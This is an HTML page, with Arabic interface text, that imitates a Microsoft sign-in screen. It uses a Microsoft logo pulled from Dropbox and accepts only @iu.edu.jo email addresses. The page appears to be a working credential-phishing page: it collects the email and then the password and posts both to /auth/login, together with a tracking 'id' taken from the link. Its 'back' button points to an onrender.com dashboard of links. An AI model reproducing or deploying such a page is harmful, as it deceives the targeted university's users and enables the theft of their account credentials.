<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f3f2f1;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 6px;
      width: 360px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      color: #333;
    }
    .form-control {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      text-align: left;
      direction: ltr;
    }
    button {
      background: #0067b8;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }
    button:hover {
      background: #005a9e;
    }
    .hidden {
      display: none;
    }
    .btn-secondary {
      background: #ccc;
      color: #000;
    }
    .btn-secondary:hover {
      background: #bbb;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://www.dropbox.com/scl/fi/e7adn2nk9mfef0q1akjs2/Microsoft_logo_-2012.svg?rlkey=35k2k9o7d9r223b16yy7lybfd&e=1&st=oj7kfx6d&dl=1" alt="Microsoft Logo">
    <h2>تسجيل الدخول</h2>

    <!-- الخطوة الأولى: إدخال البريد -->
    <div id="emailStep">
      <input type="email" id="emailInput" class="form-control" placeholder="البريد الإلكتروني" required>
      <button onclick="nextStep()">التالي</button>
      <button class="btn-secondary" onclick="goBackLinks()">رجوع</button>
    </div>

    <!-- الخطوة الثانية: إدخال كلمة المرور -->
    <form id="passwordStep" action="/auth/login" method="POST" class="hidden">
      <input type="hidden" id="hiddenEmail" name="email">
      <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
      <input type="hidden" id="linkId" name="id">
      <button type="submit">تسجيل الدخول</button>
      <button type="button" class="btn-secondary" onclick="backToEmail()">رجوع</button>
    </form>
  </div>

  <script>
    // قراءة قيمة id من رابط الصفحة
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('id');
    if (linkId) {
      document.getElementById('linkId').value = linkId;
    }

    function nextStep() {
      const email = document.getElementById('emailInput').value.trim();
      if (!email.endsWith('@iu.edu.jo')) {
        alert('❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo');
        return;
      }
      document.getElementById('hiddenEmail').value = email;
      document.getElementById('emailStep').classList.add('hidden');
      document.getElementById('passwordStep').classList.remove('hidden');
    }

    function backToEmail() {
      document.getElementById('passwordStep').classList.add('hidden');
      document.getElementById('emailStep').classList.remove('hidden');
    }

    function goBackLinks() {
      window.location.href = "https://video-dashboard-backend.onrender.com/viewlinks.html";
    }
  </script>
</body>
</html>
